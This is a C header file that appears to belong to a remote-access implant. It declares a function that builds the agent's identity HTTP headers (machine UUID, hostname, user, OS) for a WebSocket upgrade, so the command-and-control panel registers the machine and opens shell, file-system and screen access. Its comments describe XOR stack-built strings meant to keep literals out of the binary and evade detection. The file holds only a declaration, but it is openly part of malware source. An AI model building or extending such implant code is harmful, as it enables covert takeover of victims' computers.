/* identity_headers.h - the X-Agent-* identity block sent on the upgrade.
 *
 * API 1 (C2 docs/13-agent-implementation.md §4): identity no longer
 * travels as a Hello binary frame - the agent declares itself with
 * X-Agent-* HTTP headers on the WebSocket upgrade request, the relay
 * copies them into agent_connected / the agents snapshot, and the C2
 * registers ONLY agents whose Api-Version is 1 and whose Machine-Uuid
 * parses as a C# Guid. Without these headers the agent connects but is
 * never registered: no UUID to key windows on, so Shell/FileSystem/
 * Screen never open (the exact failure this module exists to fix).
 *
 * All labels/values are stack-built XOR strings (stackstrings.h) - no
 * .rdata literal; dynamic values (uuid text, hostname, ...) come from
 * system_facts and are appended as plain ASCII followed by CRLF.
 */

#pragma once

#include "types.h"
#include "system_facts.h"

/* Size the caller's header buffer must have: every fixed line + label +
 * longest dynamic value (uuid 36, hostname/user 255, os 127, build/commit
 * 10) + CRLFs, rounded up. */
#define IDENTITY_HEADERS_SIZE  900

/* Build the full X-Agent-* header block (CRLF-terminated lines, no
 * trailing blank line) into headers[IDENTITY_HEADERS_SIZE] and return its
 * length in BYTES, or 0 when the block does not fit (caller aborts the
 * connect - a headerless agent is invisible to the panel). */
USIZE build_identity_headers(CHAR headers[IDENTITY_HEADERS_SIZE]);
